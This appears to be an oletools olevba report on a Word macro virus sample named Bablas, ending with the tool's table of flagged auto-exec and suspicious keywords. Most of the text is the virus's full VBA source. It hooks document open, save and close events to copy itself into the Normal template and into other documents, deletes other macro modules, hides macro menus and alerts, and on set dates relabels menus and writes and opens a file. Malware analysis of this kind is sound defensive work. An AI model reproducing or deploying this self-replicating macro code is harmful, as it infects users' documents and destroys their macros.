olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.bs-44f3b6f520230d886bf4263f814635a96971bcdb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.bs-44f3b6f520230d886bf4263f814635a96971bcdb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GUINDA.bas 
in file: Virus.MSWord.Bablas.bs-44f3b6f520230d886bf4263f814635a96971bcdb - OLE stream: 'Macros/VBA/GUINDA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Initializer()
On Error Resume Next
With Application
.UserName = "• Ian Ace Culallad •"""
.UserAddress = "IFONTOC"
.UserInitials = "IAAC"
End With
With Dialogs(wdDialogFileSummaryInfo)
.Author = " •Ian Ace•"""
.Title = "[Guinda]"
.Subject = "IAAC/GGCB"
.Comments = "You're my very Best Guinda"
.Execute
End With
With Options
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("View").Controls("Toolbars").Enabled = False
End Sub

Sub ToolsMacro()
    G = Date
    G = MsgBox("Sik-a kayet Guinda!", vbQuestion + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub Ifontocs1()
    On Error Resume Next
    Application.Caption = "Guinda is now on the run"
    ActiveWindow.Caption = "•Ian Ace•"""
End Sub

Sub Ifontocs2()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub Fulangag()
    Dim Check_Stat As Boolean
    Check_Stat = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "GUINDA" Then Check_Stat = True
        If Obj.Name <> "GUINDA" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Check_Stat = False Then
        Application.StatusBar = "Copying my Guinda From Normal Template to " + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="GUINDA", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub Fulingig()
    Dim Status_Ok As Boolean
    Status_Ok = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "GUINDA" Then Status_Ok = True
        If Obj.Name <> "GUINDA" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Status_Ok = False Then
        Application.StatusBar = "Copying my Guinda From " + ActiveDocument.Name + " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="GUINDA", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub Check_Me()
On Error Resume Next
Randomize
Aces = (Int(Rnd * 6))
If Aces = 3 Then
For WWW = 1 To (Int(Rnd * 10))
ActiveDocument.Shapes.AddShape(Int(Rnd * 100), Int(Rnd * 150), Int(Rnd * 200), Int(Rnd * 250), Int(Rnd * 300)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Next WWW
End If
End Sub

Sub Inasin()
On Error Resume Next
If Month(Date) = 3 And Day(Date) = 8 Or Month(Date) = 10 And Day(Date) = 28 Then                              ' check random conditions
CommandBars("Tools").Controls("Macro").Caption = "[IFONTOC]"
CommandBars("Insert").Controls("Break...").Caption = "Fulangag Mo!"
CommandBars("Help").Controls("About Microsoft Word").Caption = "You're my very Best Guinda!"
CommandBars("File").Controls("Properties").Caption = "Guindalo"
CommandBars("Tools").Controls("Word Count...").Caption = "Fulingig Mo!"
CommandBars("File").Controls("Close").Caption = "Tain Inam"
CommandBars("File").Controls("New...").Caption = "Ian Ace Culallad"
CommandBars("File").Controls("Open...").Caption = "Glenda Grace Buking"
CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Montanosa"

Randomize
Ians = (Int(Rnd * 8))
ElseIf Ians = 4 Then

Open "c:\Guindalo.vxd" For Output As 1
Print #1, "Glenda Grace;"
Print #1, "Our love has been assaulted many times, and I am convinced that it is true"
Print #1, "because the longer I am away from you, the greater is my yearning to be with you again. You "
Print #1, "I cherish any thought of you, prize any memory of you that rises from the depths of my mind, and live for the day when our physical separation will no longer be. "
Print #1, "Remember that I always believe in you....."
Print #1, "Take Good Care and....I love you...."
Print #1, "Sik-a kayet nan laylaychek"
Print #1, "Love lots;"
Print #1, "Ian Ace"
Close 1
Shell "write c:\Guindalo.vxd", vbMaximizedFocus
End If
End Sub


Sub FileNew()
On Error Resume Next
    Initializer
    Fulangag
    Dialogs(wdDialogFileNew).Show
    Fulingig
End Sub

Sub FileExit()
On Error Resume Next
    Initializer
    Fulangag
    Fulingig
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub FileOpen()
On Error Resume Next
    Initializer
    Ifontocs1
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Fulangag
        ActiveDocument.Save
    End If
    Ifontocs2
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
On Error Resume Next
    Initializer
    Ifontocs1
    Fulingig
    On Error Resume Next
    NormalTemplate.Save
    Ifontocs2
End Sub

Sub FileClose()
On Error Resume Next
    Initializer
    Fulangag
    Check_Me
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    ActiveDocument.Close
End Sub

Sub FileSave()
On Error Resume Next
        Initializer
        Fulangag
        Fulingig
        ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    Initializer
    Fulangag
    Fulingig
    Dialogs(wdDialogFileSaveAs).Show
    Fulangag
    Fulingig
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Inasin
    Initializer
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

